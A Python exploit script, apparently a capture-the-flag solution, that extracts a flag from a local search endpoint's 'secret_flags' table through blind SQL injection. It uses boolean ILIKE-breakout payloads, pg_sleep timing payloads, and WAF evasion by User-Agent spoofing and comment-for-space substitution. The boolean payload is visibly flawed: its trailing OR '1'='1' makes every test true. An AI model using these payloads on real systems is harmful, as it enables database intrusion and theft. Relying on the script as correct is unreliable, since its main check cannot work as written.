#!/usr/bin/env python3

import requests
import string
import time

URL = "http://localhost:8001/search"
# include characters expected in the flag (adjust as needed)
CHARSET = string.ascii_letters + string.digits + "{}_-"
HEADERS = {
    # avoid 'python-requests' substring (WAF blocks it)
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36"
}
SESSION = requests.Session()
SESSION.headers.update(HEADERS)

REQUEST_TIMEOUT = 10.0  # seconds
SLEEP_DURATION = 2.5    # seconds used for pg_sleep fallback

def send_payload(q_payload):
    """Send a GET request with param q and return response."""
    try:
        r = SESSION.get(URL, params={"q": q_payload}, timeout=REQUEST_TIMEOUT)
        return r
    except requests.exceptions.RequestException as e:
        # Return None for network/timeouts so caller can handle
        print(f"[!] Request exception: {e}")
        return None

def content_true(resp):
    """Rudimentary content check: true if table cells present."""
    if resp is None:
        return False
    return "<td>" in resp.text.lower()

def test_content(pos, ch):
    """
    Content-based boolean test.
    Constructs a payload that breaks out of the quoted ILIKE string, ORs the condition,
    and comments out the rest. No literal spaces used.
    """
    # no spaces anywhere; use /**/ as separators
    payload = (
        f"Neon%'/**/AND/**/substring((SELECT/**/flag/**/FROM/**/secret_flags/**/LIMIT/**/1),"
        f"{pos},1)='{ch}'/**/OR/**/'1'='1--%"
    )
    r = send_payload(payload)
    return content_true(r)

def test_time(pos, ch, sleep=SLEEP_DURATION):
    """
    Time-based test using pg_sleep. If the response takes (significantly) longer,
    we assume condition is true.
    """
    payload = (
        f"Neon%'/**/AND/**/CASE/**/WHEN/**/substring((SELECT/**/flag/**/FROM/**/secret_flags/**/LIMIT/**/1),"
        f"{pos},1)='{ch}'/**/THEN/**/pg_sleep({sleep})/**/ELSE/**/pg_sleep(0)/**/END--"
    )
    t0 = time.time()
    r = send_payload(payload)
    t = time.time() - t0
    # If request timed out (None) and server likely delayed longer than timeout -> treat as true
    if r is None:
        # If the request failed due to a timeout, assume server slept -> true
        return True
    # Heuristic: if elapsed significantly greater than sleep-0.6s, treat as true
    return t > (sleep - 0.6)

def extract_flag(max_len=80, use_time_fallback=True):
    flag = ""
    for pos in range(1, max_len + 1):
        found = False
        print(f"[>] Testing position {pos}...")
        # Try content-based detection first (faster)
        for c in CHARSET:
            if test_content(pos, c):
                flag += c
                print(f"[+] pos {pos} -> '{c}'   FLAG so far: {flag}")
                found = True
                break

        if not found and use_time_fallback:
            print("[*] Content test failed for this position; trying time-based checks...")
            for c in CHARSET:
                if test_time(pos, c):
                    flag += c
                    print(f"[+] (time) pos {pos} -> '{c}'   FLAG so far: {flag}")
                    found = True
                    break

        if not found:
            print(f"[-] No match at position {pos}; stopping extraction.")
            break

        # stop if we hit the closing brace of typical flags
        if flag.endswith("}"):
            print("[*] Found closing brace, stopping.")
            break

    return flag

if __name__ == "__main__":
    print("[*] Starting blind extraction. This may take a while.")
    final = extract_flag()
    print("\n[FINAL FLAG] ", final)